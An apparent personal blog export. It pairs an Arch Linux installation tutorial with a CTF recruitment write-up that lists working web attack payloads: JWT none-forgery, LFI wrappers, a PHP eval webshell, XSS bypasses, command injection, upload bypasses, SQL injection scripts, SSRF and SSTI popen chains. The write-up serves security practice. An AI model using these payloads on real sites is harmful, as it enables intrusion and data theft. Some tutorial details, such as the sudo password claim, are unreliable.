提供子卷、写时复制、压缩、快照等高级功能，适合更加熟练的用户。 mkfs命令 1234mkfs.btrfs /dev/nvme...n...1 //将根目录分区格式化为btrfs文件系统 mkswap /dev/nvme...n...2 //对交换分区进行操作，mkswap命令用于在一个文件或者设备上建立交换分区。在建立完之后要使用sawpon命令开始使用这个交换区。最后一个选择性参数指定了交换区的大小，但是这个参数是为了向后兼容设置的，没有使用的必要，一般都将整个文件或者设备作为交换区。swapon /dev/nvme...n...2 挂载分区 mount命令的功能是将文件系统挂载到目录 123456789fdisk -l mount /dev/nvme1n.... /mnt //将根分区挂载 mkdir /mnt/boot //根目录下生成文件夹boot mount dev/nvme0n.... /mnt/boot //将引导分区挂载到/mnt/boot下 //mnt - 此目录主要是作为挂载点使用。通常包括系统引导后被挂载的文件系统的挂载点。如挂载Windows下的某个分区。 最终的布局 从上到下分别是 引导分区、根分区、交换分区 Linux分区和挂载是Linux系统管理硬盘的两个重要概念。分区是将硬盘划分为不同的逻辑区域，以便存储不同类型的数据和文件。挂载是将一个分区与一个目录联系起来，使得该目录可以访问该分区中的数据和文件。linux为什么要挂载？ 如果硬盘是一片空地，那么分区和挂载就是把一片空地建成不同的房间（分区），每个房间存放不同类型的货物，再把房间的钥匙发给使用这个房间里的货物的人（挂载）。如果不挂载，那么人要使用某个货物时，就会因为没有钥匙而无法使用这个货物。为什么不直接访问&#x2F;dev目录？ 直接访问&#x2F;dev目录，就相当于把房间都拆了，直接从空地上寻找需要的货物，这不方便，也不安全（空地货物可能会被弄乱）Linux分区和挂载有以下几个用途：提高系统的安全性。没有挂载的分区是无法访问的，这样可以防止恶意用户或程序对系统造成破坏。提高系统的效率。通过合理地划分和挂载分区，可以减少系统维护文件的规模，提高磁盘空间的利用率和读写速度。适应多用户操作系统。Linux是一个多用户操作系统，不同用户可能有不同的权限和需求。通过分区和挂载，可以实现对用户空间、临时文件、日志文件等的隔离和管理。 选择软件镜像源123456nano /etc/pacman.d/mirrorlist //手动添加镜像 Server =https://mirrors.ustc.edu.cn/archlinux/$repo/os/$archServer =......//ctrl+x保存退出 在 Arch Linux 中，软件仓库就好比手机中的应用商店，软件包是通过软件仓库进行分发的。软件仓库镜像是软件仓库的复制品，同一个软件仓库可以在世界各地建立软件仓库镜像，以便于不同地区的用户下载。因此选择一个合适的软件仓库镜像对于您更新软件包数据库以及下载软件包的速度有很大影响。 pacman命令 nano编辑器 、 安装基础包 我们使用 pacstrap 安装 base，linux，linux-firmware 三个软件包，它们分别是基础包组，linux 内核和驱动程序。此外，如果您使用 2019 年及以后生产的笔记本电脑，可能需要安装 sof-firmware，否则可能没有声音[23]。 Arch linux 官方提供了 linux，linux-lts，linux-zen，linux-hardened 内核[24]，但是对于初学者，只推荐使用 linux 内核。 123pacstrap -K /mnt base base-devel linux linux-firmware sudo nano vim networkmanager intel-ucode//安装base,base-devel,linux,linux-firmware,sudo,nano,vim,networkmanager,intel-ucode//intel-ucode是CPU微码，用于intel的cpu固件更新？？？这里我不确定( 123pacman -Sy archlinux-keyring //如若报错则需更新keyring pacstrap -K /mnt base base-devel linux linux-firmware sudo nano vim networkmanager intel-ucode //然后重新安装 fstab是一个系统文件，决定了系统启动时如何自动挂载分区。没有 fstab，系统将找不到根分区，从而无法启动。fstab 有一定的格式，我们用一个例子说明 fstab 文件的格式。 1genfstab -U/mnt &gt;&gt; /mnt/ect/fstab 其中“genfstab -U &#x2F;mnt”是以 UUID 的描述方式生成 fstab，“&gt;&gt;” 的意思是，将输出结果附加在后面的文件之后。 生成完成后，记得使用 cat 命令打印文件内容，仔细检查一遍。 1cat /mnt/etc/fstab 使用chroot使用chroot切换到安装的新系统 1arch-chroot /mnt 这里我顿悟了，之前的根目录在&#x2F;mnt下，这里chroot直接把根目录移动回系统&#x2F;下，&#x2F;mnt相当于完成汉诺塔的倒数第二步 chroot命令 设置时区123ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime //设置上海时间 hwclock --systohc //设置硬件时间 ln命令 hwclock命令 本地化 我们将设置 locale、终端键盘布局和字体。locale 决定了系统的语言和格式，包括终端显示哪种语言，数字、时间和货币以哪国的格式显示等等。 123nano /etc/locale.gen//取消en_US.UTF-8 和zh_CN.UTF-8前的注释locale-gen //生成locale 12nano /etc/locale.conf //修改locale.conf文件//输入LANG=en_US.UTF-8，ctrl+x保存 确定系统名和网络管理系统配置1234nano /etc/hostname//输入archlinux，确定系统名systemctl enable NetworkManager//注意大小写//使用 systemd 设置 NetworkManager 开机自动启动 设置root密码 root 用户是 Linux 系统中权限最高的用户，有些敏感的操作必须通过 root 用户进行，比如使用 pacman。我们之前进行所有的操作也都是以 root 用户进行的。也正是因为 root 的权限过高，如果使用不当会造成安全问题，所以我们在下一篇文章中会新建一个普通用户来进行日常的操作。在这里我们需要为 root 用户设置一个密码。 123passwd//输入密码，这里不会显示已经输入的密码//再次输入密码 新建普通用户1234useradd -m -G wheel -s /bin/bash [username] //将用户添加到wheel组，root也在wheel组 passwd [username]//输入密码并重复输入确定 123visudo //打开/etc/sudoers文件进行编辑设置sudo//这里使用传统vim编辑器，按i进入编辑模式，按esc退出编辑模式，输入:wq退出保存//取消%wheel ALL前的注释 这里的意思是让wheel组下的所有用户都能免去输入密码使用sudo权限 sudo权限 Grub安装 GRUB 是什么？GRUB 是一个用于加载和管理系统启动的完整程序。它是 Linux 发行版中最常见的*引导程序(bootloader)*。引导程序是计算机启动时运行的第一个软件。它加载 操作系统的内核，然后再由内核初始化操作系统的其他部分（包括 Shell、显示管理器、桌面环境 等等）。 123pacman -S grub efibootmgr os-prober //安装系统探测器 nano /etc/default/grub 新版grub默认禁用os-prober,需要手动启用 去掉GRUB_DISABLE前面的注释 123grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=GRUB //安装Grub grub-mkconfig -o /boot/grub/grub.cfg //生成Grub配置 手动添加Windows启动项1blkid /dev/nvme0n...... //查看引导分区信息 blkid命令 记录下UUID后面的数字 1nano/boot/grub/grub.cfg 有概率os-prober无法探测到windows,需要手动添加windows启动项 输入红框中的内容，红圈中的内容为刚刚记下来的数字 12345exit //保存后退出 umount -R /mnt // /mnt完成了它的使命，把它卸载掉 reboot //重启查看能否正常启动Windows 进入Arch Linux美化1root //输入密码登录root账户 重复之前的联网操作 1234567891011121314151617rfkill unblock wifiip linkip link set wlan0 upiwctl station wlan0 scanstation wlan0 get-networksstation wlan0 connect [wifi名字]exitping baidu.com 安装Gnome桌面 GNOME是一个自由开源的桌面环境，是 Linux 操作系统中最常用的桌面环境之一。 GNOME的目标是为 Linux 系统提供现代、易用的桌面环境，以提高用户的体验和生产力。 它提供了一个用户友好的界面和许多常用的应用程序，如文件管理器、文本编辑器、终端、图形 图像处理 程序 1pacman -S gnome gnome-tweaks //然后一路回车 安装相应的显卡驱动注意这里只要安装集显驱动而不要安装英伟达驱动，原因是arch linux可能检测不到 1pacman -S mesa xf86-video-b 1systemctl enable gdm GDM (The GNOME Display Manager)是GNOME显示环境的管理器，并被用来替代原来的X Display Manager 1reboot 于是就进入gnome桌面了 下载软件下载fcirx输入法、浏览器等必要软件 1sudo pacman -S git ntfs-3g wqy-zenhei firefox fcitx5-im fcitx5-chinese-addons &#x2F;etc&#x2F;environment是设置整个系统的环境，而&#x2F;etc&#x2F;profile是设置所有用户的环境，前者与登录用户无关，后者与登录用户有关。 1sudo nano /etc/environment 输入： 123456789GTK_IM_MODULE=fcitxQT_IM_MODULE=fcitxXMODIFIERS=@im=fcitxSDL_IM_MODULE=fcitxGLFW_IM_MODULE=ibus 1reboot 设置中文输入法 注意这个输入法是用ctrl+空格启用的 设置蓝牙连接安装蓝牙模块并启动蓝牙服务 123sudo pacman -S bluez bluez-utilssudo systemctl enable bluetooth.servicesudo systemctl start bluetooth.service Bluez是Linux系统上的蓝牙协议栈，自带了很多有用的工具，Bluetoothctl就是其一 12bluetoothctl --help 查看帮助命令bluetoothctl -v 查看蓝牙版本 12345678bluetoothctl 进入蓝牙管理工具环境[bluetooth]# power on 打开蓝牙[bluetooth]# agent on 开启代理[bluetooth]# scan on 扫描蓝牙设备[bluetooth]# pair xx:xx:xx:... 配对该设备[bluetooth]# trust xx:xx:xx:... 信任该设备[bluetooth]# connect xx:xx:... 连接该设备[bluetooth]# disconnect xx:xx:... 断开蓝牙 安装蓝牙音频 1sudo pacman -S pulseaudio-bluetooth 蓝牙图形化管理工具安装 1sudo pacman -S bluedevil 或 1sudo pacman -S blueman 完结撒花🌸Linux 系统结构 &#x2F;bin：bin 是 Binaries (二进制文件) 的缩写, 这个目录存放着最经常使用的命令。 &#x2F;boot：这里存放的是启动 Linux 时使用的一些核心文件，包括一些连接文件以及镜像文件。 &#x2F;dev ：dev 是 Device(设备) 的缩写, 该目录下存放的是 Linux 的外部设备，在 Linux 中访问设备的方式和访问文件的方式是相同的。 &#x2F;etc：etc 是 Etcetera(等等) 的缩写,这个目录用来存放所有的系统管理所需要的配置文件和子目录。 &#x2F;home：用户的主目录，在 Linux 中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的，如上图中的 alice、bob 和 eve。 &#x2F;lib：lib 是 Library(库) 的缩写这个目录里存放着系统最基本的动态连接共享库，其作用类似于 Windows 里的 DLL 文件。几乎所有的应用程序都需要用到这些共享库。 &#x2F;lost+found：这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。 &#x2F;media：linux 系统会自动识别一些设备，例如U盘、光驱等等，当识别后，Linux 会把识别的设备挂载到这个目录下。 &#x2F;mnt：系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在 &#x2F;mnt&#x2F; 上，然后进入该目录就可以查看光驱里的内容了。 &#x2F;opt：opt 是 optional(可选) 的缩写，这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。 &#x2F;proc：proc 是 Processes(进程) 的缩写，&#x2F;proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的ping命令，使别人无法ping你的机器： 1echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all &#x2F;root：该目录为系统管理员，也称作超级权限者的用户主目录。 &#x2F;sbin：s 就是 Super User 的意思，是 Superuser Binaries (超级用户的二进制文件) 的缩写，这里存放的是系统管理员使用的系统管理程序。 &#x2F;selinux： 这个目录是 Redhat&#x2F;CentOS 所特有的目录，Selinux 是一个安全机制，类似于 windows 的防火墙，但是这套机制比较复杂，这个目录就是存放selinux相关的文件的。 &#x2F;srv： 该目录存放一些服务启动之后需要提取的数据。 &#x2F;sys： 这是 Linux2.6 内核的一个很大的变化。该目录下安装了 2.6 内核中新出现的一个文件系统 sysfs 。 sysfs 文件系统集成了下面3种文件系统的信息：针对进程信息的 proc 文件系统、针对设备的 devfs 文件系统以及针对伪终端的 devpts 文件系统。 该文件系统是内核设备树的一个直观反映。 当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建。 &#x2F;tmp：tmp 是 temporary(临时) 的缩写这个目录是用来存放一些临时文件的。 &#x2F;usr： usr 是 unix shared resources(共享资源) 的缩写，这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于 windows 下的 program files 目录。 &#x2F;usr&#x2F;bin：系统用户使用的应用程序。 &#x2F;usr&#x2F;sbin：超级用户使用的比较高级的管理程序和系统守护程序。 &#x2F;usr&#x2F;src：内核源代码默认的放置目录。 &#x2F;var：var 是 variable(变量) 的缩写，这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。 &#x2F;run：是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。如果你的系统上有 &#x2F;var&#x2F;run 目录，应该让它指向 run。 在 Linux 系统中，有几个目录是比较重要的，平时需要注意不要误删除或者随意更改内部文件。 &#x2F;etc： 上边也提到了，这个是系统中的配置文件，如果你更改了该目录下的某个文件可能会导致系统不能启动。 &#x2F;bin, &#x2F;sbin, &#x2F;usr&#x2F;bin, &#x2F;usr&#x2F;sbin: 这是系统预设的执行文件的放置目录，比如 ls 就是在 &#x2F;bin&#x2F;ls 目录下的。 值得提出的是 &#x2F;bin、**&#x2F;usr&#x2F;bin** 是给系统用户使用的指令（除 root 外的通用用户），而&#x2F;sbin, &#x2F;usr&#x2F;sbin 则是给 root 使用的指令。 &#x2F;var： 这是一个非常重要的目录，系统上跑了很多程序，那么每个程序都会有相应的日志产生，而这些日志就被记录到这个目录下，具体在 &#x2F;var&#x2F;log 目录下，另外 mail 的预设放置也是在这里。 参考 本文参考： ip link 命令总结-CSDN博客 Linux命令大全(手册) – 真正好用的Linux命令在线查询网站 (linuxcool.com) linux中ctl代表什么缩写？很多命令都带结尾ctl，另外ifconfig和nmcli有什么区别？ - 知乎 (zhihu.com) Arch Linux 详细安装教程，萌新再也不怕了！「2023.10」 - 知乎 (zhihu.com) 【超简单】Windows+Arch Linux双系统双磁盘方案，全程不废话_哔哩哔哩_bilibili Linux—带你区分”根目录” 和 “家目录”_根目录、家目录的路径分别是什么?可以用什么符号表示,用来快速访问?-CSDN博客 https://blog.csdn.net/qq_61683908/article/details/129430286 linux下的mnt文件夹用来干嘛,Linux&#x2F;mnt目录主要用于什么？_Killer Seven的博客-CSDN博客 ArchWiki (archlinux.org) Linux 黑话解释：Linux 中的 GRUB 是什么？ | Linux 中国 - 知乎 (zhihu.com) 什么是GNOME_GNOME简介_GNOME的优势以及应用场景-腾讯云开发者社区 (tencent.com) etc&#x2F;profile和&#x2F;etc&#x2F;environment的比较 - 明明是悟空 - 博客园 (cnblogs.com) ArchLinux安装使用蓝牙之基础_archlinux 蓝牙_kler的博客-CSDN博客 Linux 系统目录结构 | 菜鸟教程 (runoob.com)","categories":[{"name":"Learning record","slug":"Learning-record","permalink":"https://foreon.github.io/categories/Learning-record/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://foreon.github.io/tags/linux/"}]},{"title":"YuLin 2023 Recruit Writeup","slug":"YuLin 2023 Recruit Writeup","date":"2023-11-03T15:56:39.000Z","updated":"2023-12-02T18:15:14.358Z","comments":true,"path":"posts/36124.html","link":"","permalink":"https://foreon.github.io/posts/36124.html","excerpt":"","text":"YuLin 2023 Recruit Writeup前言（叠个甲先part1是用word写的，直接黏贴过来量太多就不修改了😭，part2 是用md，可能看起来舒服一点。如果读者看得比较难受，这非常正常，请原谅我的懒惰🙇part1:Tutorial1.http这里要注意，admin是改cookie里的admin&#x3D;1! 2.302跳转 查看源代码找到&#x2F;302.php Curl -i 找到flag 3.encode 关于decode可以看看这个链接 https://www.cnblogs.com/ruoli-s/p/14206145.html 判断第一个是md5 解密得到Yulin 判断第二个是hex编码 解码得到Sec{we_mu5t_kn0w 第三个是base64 解码得到_c0mm0n 判断第四个是html实体编码 解码得到_enc0d1ngs} 组合一下得到flag YulinSec{we_mu5t_kn0w_c0mm0n _enc0d1ngs} 4.Method 被提示有很多httpmethod 拿postman一个个试就试出来了 5.cal-1 源代码进去改下长度就完事 6.cal-2 发现要用post的方法传数据，就完事了 7.cal-3 用python脚本做 我还学了好一会，感觉python脚本是个大问题 import requestss&#x3D;requests.Session()url&#x3D;’http://43.142.109.233:44504/index.php‘r&#x3D;s.get(url) res&#x3D;r.text a&#x3D;res.find(““)b&#x3D;res.find(“&#x2F;p&gt;”,a)#找到我们要计算的式子的前后位置num&#x3D;res[a+3:b-1]print(a)print(b)print(num)r&#x3D;s.post(url,data&#x3D;{‘result’:eval(num)})print(r.content) 8.https 前言: 经大佬提醒,了解了不少jwt知识 了解到两种主要思路 1.弱口令把key爆出来 2.使用none的方式 由于安装不清楚第一次所需的工具😅，所以采用第二种方法 原理如下所示 本题抓包发现token,于是采用jwt绕过 1.将头部信息的alg值改为none，并进行base64加密 2.将声明部分的admin值改为true，也进行base64加密 3.新组合的JWT应该为头部``.``声明``.(因为头部中的加密方式为none，所以签名部分可以舍去)，但又由于&#x3D;号会与url解码产生歧义，所以需要将&#x3D;号删除，而Base64URL是支持这种写法的 最终的JWT值为ewogICJhbGciOiAibm9uZSIsCiAgInR5cCI6ICJKV1QiCn0.ewogICJhZG1pbiI6ICIxIiwKICAiaWF0IjogMTY5NDk0OTM0NSwKICAiZXhwIjogMTY5NDk1NjU0NSwKICAianRpIjogIjM0YTczNGEzODAzZGY1NmZlYmIzOTg3MzJlOWQwZDE5Igp9. 4.把token放到cookie里得到flag LFI 依照提示传参即可 不知道为啥hackbar的post这类题用不了？ 那就用postman来post 使用file&#x3D;php:&#x2F;&#x2F;input + post 再file&#x3D;php:&#x2F;&#x2F;input + post 得到flag 使用data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64编码后的数据)data:&#x2F;&#x2F;text&#x2F;plain, data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4&#x3D; data:&#x2F;&#x2F;text&#x2F;plain, data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4&#x3D; 得到flag 看到提示，直接想到用base64编码转出 file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php 得到一串base64编码，转码之后即得到flag 看教程绕过file_get_contents($file) 了但是还对原理一知半解 采用第一种方式就拿到flag了 文档里说的很清楚了，话说我自己试的一句话木马就不太好使，还得是图片里的这个好使，然后就生成一句话木马图片呗，然后蚁剑 &lt;?phpfputs(fopen(“shell.php”,&#39;w&#39;),&#39;&lt;?php @eval($_POST[”leon“])；?&gt; &#39;); ?&gt; 要注意的是蚁剑访问的目录是生成的shell.php 即为http://43.142.109.233:21005/shell.php 这题花了我大概一天的时间钻研，最终做出来了 参考：LFI 绕过 Session 包含限制 Getshell_通过sessid进行文件写即可,使用 file:&#x2F;&#x2F;localhost&#x2F; 进行绕过_zhang三的博客-CSDN博客 先了解session知识吧 Phpinfo先找到session的储存路径 Session自定义一个 然后传一个一句话木马 发现可以控制了 于是果断蚁剑解出 补一个大佬的做法： 思路更清晰一些 XSS 看看这这篇攻略XSS挑战赛解题思路_多崎巡礼的博客-CSDN博客 看源代码发现有个hidden的 name 普普通通构造个playload就完事了 name=&lt;script&gt;alert(1)&lt;/script&gt; 这里我本来想用闭合标签来完成 但是发现&lt;被转义了，只能利用 &#39;onmouseover=alert(1)//，不过这里需要用单引号闭合，构造playload 和上题一样，只不过把单引号换成双引号来闭合罢了 第四题发现会把on转成o_n 而且会给 中间的东西加双引号 于是上网查攻略,知道要用伪协议 &quot;&gt;&lt;iframe src=javascript:alert(1)&gt; &quot;&gt;&lt;a href=javascript:alert(1)&gt; &quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;zhouzhong&lt;/a&gt; &quot;&gt;&lt;a href=&quot;javascript:%61lert(1)&quot;&gt;zhouzhong&lt;/a&gt; // 就做出来了 5. 试了试”&gt;1&lt;script&gt;alert(1)&lt;/script&gt; // 可能是屏蔽了script,于是思路是双写绕过 &quot;&gt;&lt;scriscriptpt&gt;alert(0)&lt;/scriscriptpt&gt;//这些双写也可以 就拿到flag了 用伪协议发现过滤了javascript，于是查攻略吧 javascrip&amp;#x74;:alert(1) javasc&amp;#x72;ipt:alert1 javasc&amp;#x0072;ipt:alert1 第一次见这种，猜测t_sort那里是隐藏的搜索框 于是看攻略吧 这里只要构造如下playload就行 t_sort=”type=’’text”onclick = ”alert(1) 复现了一下发现这个双引号”不能用 得用下面的双引号 “ 未解之谜，先放这吧 t_sort=&quot;type=&quot;text&quot;onclick = &quot;alert(1) XSS看攻略愉快的ak了 话说真的不是按这个攻略出题的吗( RCE 在当前目录下没找，于是 ls &#x2F; ping127.0.0.1;ls &#x2F; # 找到flag ping127.0.0.1;cat &#x2F;flag_3124131231 # ping127.0.0.1;ls # 有waf 试了一下过滤了;|&amp;’&#96;等等 于是用%0a``绕过 ip=127.0.0.1%0als / 再ip&#x3D;127.0.0.1%0acat&#x2F;flag_31241421414 得到flag 试了一下过滤了ls 文件上传 采用了一种新的方式 传一句话木马文件蚁剑后门报错捏 于是火狐禁止js，传一个.php文件上去 路径是复制的图像链接 然后蚁剑后门 考察.htaccess文件 用记事本写这样一个名为.htaccess的文件 注意保存为所有类型 &lt;FilesMatch“.png”&gt; SetHandler application&#x2F;x-httpd-php 该文件的意思是，只要遇到文件名中包含有”.png”字符 串的，统一按照 php 文件来执行。然后就可以上传一个带一句话木马的文件，例如a_php.gif，会 被当成php执行。该方法其实不是漏洞，是Apache的特性。该方法常用于黑客入侵网站之后，不想 被发现，留一个隐蔽的后门。 然后先上传.htaccess文件,再上次木马.png 然后蚁剑就完事了 上传php文件抓包，修改文件类型为image&#x2F;png 然后就可以上传了，于是愉快的蚁剑 考察文件头绕过 用winhex 但是这样修改后用蚁剑连接 http://43.142.109.233:30004/upload/muma.png 还是报错，于是再次采用上传php用burp改png的方法 其实也可以换一种生成shell.php的png图片木马 下次再试 然后蚁剑吧 很明显要绕过黑名单这些 但是明显黑名单太少了，这里先用大写绕过罢 然而大写绕过并不可行？ 再次尝试双写绕过，成了，于是蚁剑 再次尝试双写 发现不行，添加了一个空格 这次大写绕过又行了？ 那就蚁剑吧 提示%00截断 原理如下 照猫画虎就出来了 考察16进制00截断 Burp上传图片木马抓包 在路径后面加一个1.php+,再在hex里找到+对应的编码，并改成00,就跟上题一样了 提示白名单，但是试一下又觉得是黑名单？ 双写大写绕过都没用，那试试别的吧 莫名奇妙做出来了？ 改成这样 注意蚁剑连接phtml还是小心(为什么 这题要再做一遍 为什么这里多了个空格，怎么复现？ 再做了一次为什么又没空格了，而且这里路径为什么不需要大写？ 11.二次渲染 合成一个gif木马文件，注意文件头要对 还是不行？那还是找一张真正的gif合成吧 现在行了 下载gif，比对没有改变的地方 然后在不改变的地方插入一句话木马 蚁剑连图片链接老报错 去学了一下 其实用一个文件包含漏洞就能用蚁剑连接 要利用include.php?file&#x3D;upload&#x2F; 然后就可以用蚁剑连接了 网页也是可以访问的 提示是利用move_uploaded_file($temp_file,$img_path)的漏洞，这个函数它有一个特性，会忽略到文件末尾的&#x2F;. 这样上传，然后burp抓包 把名字改成muma.php&#x2F;. 蚁剑连接 &#x2F;upload&#x2F;muma.php发现可以访问了 顺藤摸瓜找到了原帖（搜索能力也是能力！ 直接看原帖吧，哥们代码审计还看不明白 Sql注入 1.普通注入 普普通通的整形闭合 如图所示做完 提示是报错注入 试了一下是整形闭合捏 以下黏贴之后的代码有问题 爆数据库 http://43.142.109.233:20002/?id=-1 and updatexml(1,concat(‘~’, substr( (select group_concat(schema_name) from information_schema.schemata) , 1 , 31) ),3)– a 爆表名 http://43.142.109.233:20002/?id=-1 and updatexml(1,concat(‘~’, substr( (select group_concat(table_name) from information_schema.tables wheretable_schema&#x3D;database()) , 8 , 31) ),3)– a 注意这里要取后面的字符才完整 爆列名 http://43.142.109.233:20002/?id=-1 and updatexml(1,concat(‘~’, substr( (select group_concat(column_name) from information_schema.columns wheretable_name&#x3D;’flag’) , 1 , 31) ),3)– a 爆flag http://43.142.109.233:20002/?id=-1 and updatexml(1,concat(‘~’, substr( (select group_concat(flag) from flag) , 10 , 31) ),3)– a 注意flag太长显示不完全，分段来看吧 布尔盲注 一些基础知识 操作 开搞 试了一下发现是整形形闭合 http://43.142.109.233:20003/?id=1and length(database())&#x3D;8 尝试到8发现回显ok,说明数据库名为8 一个个把数据名试出来 推荐二分查找法 http://43.142.109.233:20003/?id=1and ASCII(SUBSTR(database(),2,1)) &#x3D; 101 ok查出来是security 发现搞不定啊,这工程量。。。还得上脚本 import requests 只需要修改url 和 两个payload即可目标网址（不带参数）url &#x3D; “http://43.142.109.233:20003/“ 猜解长度使用的payloadpayload_len &#x3D; “””?id&#x3D;1 and length( (database()) ) &lt; {n} “”” 枚举字符使用的payloadpayload_str &#x3D; “””?id&#x3D;1 and ascii( substr( (database()) ,{n},1) ) &#x3D; {r} “”” 获取长度def getLength(url, payload): length &#x3D; 1 # 初始测试长度为1 while True: response &#x3D; requests.get(url&#x3D; url+payload_len.format(n&#x3D; length)) # 页面中出现此内容则表示成功 if ‘OK’ in response.text: print(‘测试长度完成，长度为：’, length,) return length; else: print(‘正在测试长度：’,length) length +&#x3D; 1 # 测试长度递增 获取字符def getStr(url, payload, length): str &#x3D; ‘’ # 初始表名&#x2F;库名为空 # 第一层循环，截取每一个字符 for l in range(1, length+1): # 第二层循环，枚举截取字符的每一种可能性 for n in range(33, 126): response &#x3D; requests.get(url&#x3D; url+payload_str.format(n&#x3D; l, r&#x3D; n)) # 页面中出现此内容则表示成功 if ‘OK’ in response.text: str+&#x3D; chr(n) print(‘第’, l, ‘个字符猜解成功：’, str) break; return str; 开始猜解length &#x3D; getLength(url, payload_len)getStr(url, payload_str, length) 每次要改的地方只有标红的区域 database() 爆出来表名为security 这里先手动对当前数据库爆表的数量，很方便 http://43.142.109.233:20003/?id=1and (select COUNT(*) from information_schema.tables wheretable_schema&#x3D;database())&#x3D;5 爆出来是5 selecttable_name from information_schema.tables where table_schema &#x3D; database() limit0,1 selecttable_name from information_schema.tables where table_schema &#x3D; database() limit0,1 第一个表 referers selecttable_name from information_schema.tables where table_schema &#x3D; database() limit 1,1 selecttable_name from information_schema.tables where table_schema &#x3D; database() limit 1,1 只改limit后面的数就完事 第二个表 emails 以此推类 第三个表users 第四个表flag 第五个表 就不查了 4.手动爆一些users的列数量 http://43.142.109.233:20003/?id=1and (select COUNT(*) from information_schema.columns wheretable_schema&#x3D;database() and table_name&#x3D;”users”)&#x3D;3 爆出来是3 注意这里要用双引号，我也不知道为啥。。 selectcolumn_name from information_schema.columns where table_schema &#x3D; database() andtable_name &#x3D;”users” limit 0,1 selectcolumn_name from information_schema.columns where table_schema &#x3D; database() andtable_name&#x3D;”users” limit 0,1 selectcolumn_name from information_schema.columns where table_schema &#x3D; database() andtable_name&#x3D;”users” limit 0,1 测出uers第一列:id 测出uers第三列: 测出uers第三列:password 不测了，才发现前面搞错了 flag已经整出来了 那就重复这些步骤找flag的列 测出flag第二列flag selectflag from flag limit 0,1 终于爆出来了 可能是我脚本的问题，速度是龟速，靠脚本还是花了好久时间，不过只是为了解出题那瞬间的多巴胺分泌带来的快感，也是值得的 找朋友要了个更快的自动化脚本 还是整形闭合 在朋友脚本的基础上改了一下做出来了 不过精确度不高 延时盲注的一些语句： “1and if((select count(table_name) frominformation_schema.tables where table_schema &#x3D; ‘database()’) &#x3D; 1,sleep(2),1) 主要是运用if三元式和sleep的原理 YulinSec{0kfjtXaE8VJxXFG9BjZSy0Yn6dVLLMwbQ3OiaI20} 还不会 Babyurl 考察ssrf urls&#x3D;http://0x7F.0.0.1/flag.php SSTI 1. 1.&#123;&#123;''.__class__&#125;&#125; # 获得单引号的类型 2.&#123;&#123;''.__class__.__base__&#125;&#125; #获得object 3.&#123;&#123;''.__class__.__base__.__subclasses__()&#125;&#125;#获得基类 这里要写个脚本得到os._wrap_close的键值 4.&#123;&#123;''.__class__.__base__.__subclasses__()[127]&#125;&#125;#这里我们利用的是&lt;class&#39;os._wrap_close&#39;&gt;类 5.&#123;&#123;''.__class__.__base__.__subclasses__()[127].__init__.__globals__&#125;&#125;#将该类实例化并且全局搜索查找所有的方法、变量和参数 6.&#123;&#123;''.__class__.__base__.__subclasses__()[127].__init__.__globals__['popen']('ls').read()&#125;&#125;#利用popen函数执行命令 7.&#123;&#123;''.__class__.__base__.__subclasses__()[127].__init__.__globals__['popen']('cat flag').read()&#125;&#125;#最后获得flag 不是直接cat，但差不多吧 2. 过滤&#123;&#123;` `用&#123;%print(来代替` `比如` `&#123;%print(''.__class__)%&#125;` `然后按第一题思路就行` `&#123;%print(''.__class__.__base__.__subclasses__()[127]) .__init__.__globals__['popen']('cat /flag').read()%&#125;` `3.` `过滤[]，用getitem` `&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(127).__init__.__globals__.__getitem__('popen')('ls').read()&#125;&#125; &#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(127).__init__.__globals__.__getitem__('popen')('cat` `/flag').read()&#125;&#125; 4. 过滤下划线 用16进制编码绕过 &#123;&#123;()['\\x5f\\x5fclass\\x5f\\x5f']['\\x5f\\x5fbase\\x5f\\x5f']['\\x5f\\x5fsubclasses\\x5f\\x5f']()[127]['\\x5f\\x5finit\\x5f\\x5f']['\\x5f\\x5fglobals\\x5f\\x5f']['popen']('cat` `/flag').read() &#125;&#125; 5. 过滤单双引号 &#123;&#123;[].__class__.__mro__[1].__subclasses__()[127].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125; 同时get传参?a=popen&amp;b=cat /flag 6． 过滤小数点 &#123;&#123;()['__class__']['__base__']['__subclasses__']()[127]['__init__']['__globals__']['popen']('cat` `/flag')['read']()&#125;&#125; 7. 过滤了一堆关键字 &#123;&#123;()['__cla'+'ss__']['__ba'+'se__']['__subcl'+'asses__']()[127]['__in'+'it__']['__glo'+'bals__']['pop'+'en']('c'+'at` `/fl'+'ag')['re'+'ad']()&#125;&#125; # part2:YuLin 2023 Recruit Writeup part 2word太难用了，于是part2都用md来写 [Easy]盒武器picture1识图出来：武汉理工大学南湖校区心至楼 picture2在地图附件找武汉长江大桥的公园 试出来：湖北省武汉市汉阳区龟山北路5号龟山风景区 看出题人空间找到10.4到10.5的武汉游玩信息 穷举试出来：2023年10月05日18时 babyphp12345678910111213141516&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if (isset($_GET[&#x27;a&#x27;]) 